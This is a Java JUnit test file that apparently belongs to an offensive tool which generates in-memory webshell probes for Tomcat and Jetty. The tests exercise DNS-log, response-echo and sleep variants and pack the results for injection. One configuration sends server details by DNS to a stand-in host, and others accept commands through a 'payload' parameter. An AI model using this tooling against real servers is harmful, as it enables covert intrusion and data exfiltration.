package com.reajason.javaweb.examples.probe;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.DnsLogConfig;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseConfig;
import com.reajason.javaweb.probe.config.SleepConfig;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

/**
 * 生成期契约：四种探测马都能生成、产物字段齐备、能被已有 packer 打包。
 * 真实容器的注入与回显验证见 integration-test（如 Tomcat8SleepServerContainerTest）。
 *
 * @author ReaJason
 */
class ProbeGenerationTest {

    @Test
    void dnsLogProbeGeneratesAndPacks() {
        ProbeShellResult result = ProbeShellGenerator.generate(
                ProbeConfig.builder().probeMethod(ProbeMethod.DNSLog).probeContent(ProbeContent.Server).build(),
                DnsLogConfig.builder().host("xxx.dns.log").build());

        assertProbeResult(result);
        assertNotNull(result.getProbeContentConfig());
        assertFalse(pack(result).isEmpty());
    }

    @Test
    void responseBodyProbeGeneratesAndPacks() {
        ProbeShellResult result = ProbeShellGenerator.generate(
                ProbeConfig.builder().probeMethod(ProbeMethod.ResponseBody).probeContent(ProbeContent.Command).build(),
                ResponseConfig.builder().server(Server.Tomcat).reqParamName("payload").build());

        assertProbeResult(result);
        assertNotNull(result.getProbeContentConfig());
        assertFalse(pack(result).isEmpty());
    }

    @Test
    void responseHeaderProbeGeneratesAndPacks() {
        ProbeShellResult result = ProbeShellGenerator.generate(
                ProbeConfig.builder().probeMethod(ProbeMethod.ResponseHeader).probeContent(ProbeContent.Command).build(),
                ResponseConfig.builder().server(Server.Tomcat).reqParamName("payload").respHeaderName("X-Result").build());

        assertProbeResult(result);
        assertNotNull(result.getProbeContentConfig());
        assertEquals("X-Result", ((ResponseConfig) result.getProbeContentConfig()).getRespHeaderName());
        assertFalse(pack(result).isEmpty());
    }

    @Test
    void responseHeaderDefaultsToXPrefixedName() {
        ProbeShellResult result = ProbeShellGenerator.generate(
                ProbeConfig.builder().probeMethod(ProbeMethod.ResponseHeader).probeContent(ProbeContent.Command).build(),
                ResponseConfig.builder().server(Server.Tomcat).build());

        assertTrue(((ResponseConfig) result.getProbeContentConfig()).getRespHeaderName().startsWith("X-"));
    }

    @Test
    void sleepProbeGeneratesAndPacks() {
        ProbeShellResult result = ProbeShellGenerator.generate(
                ProbeConfig.builder().probeMethod(ProbeMethod.Sleep).probeContent(ProbeContent.Server).build(),
                SleepConfig.builder().server(Server.Tomcat).seconds(5).build());

        assertProbeResult(result);
        assertNotNull(result.getProbeContentConfig());
        assertFalse(pack(result).isEmpty());
    }

    @Test
    void probeOnlyDependsOnCore() {
        // 回显马模板（writer / filter probe / payload）全部住在 core 里：
        // 生成一个针对非 Tomcat 容器的 ResponseBody 探测马也不需要对应 server 模块
        ProbeShellResult result = ProbeShellGenerator.generate(
                ProbeConfig.builder().probeMethod(ProbeMethod.ResponseBody).probeContent(ProbeContent.Bytecode).build(),
                ResponseConfig.builder().server(Server.Jetty).build());
        assertProbeResult(result);
    }

    private static void assertProbeResult(ProbeShellResult result) {
        assertNotNull(result);
        assertFalse(result.getShellClassName().isEmpty(), "shellClassName");
        assertTrue(result.getShellBytes().length > 0, "shellBytes empty");
        assertEquals(result.getShellBytes().length, result.getShellSize());
        assertFalse(result.getShellBytesBase64Str().isEmpty(), "shellBytesBase64Str");
        // base64 字符串与字节一致：投递方拿到的字符串必须能还原出内存马本体
        assertArrayEquals(result.getShellBytes(),
                java.util.Base64.getDecoder().decode(result.getShellBytesBase64Str()));
    }

    private static String pack(ProbeShellResult result) {
        return Packers.ScriptEngine.getInstance().pack(ClassPackerConfig.of(
                result.getShellClassName(), result.getShellBytes(), result.getShellBytesBase64Str(),
                result.getProbeConfig() != null && result.getProbeConfig().needByPassJavaModule()));
    }
}
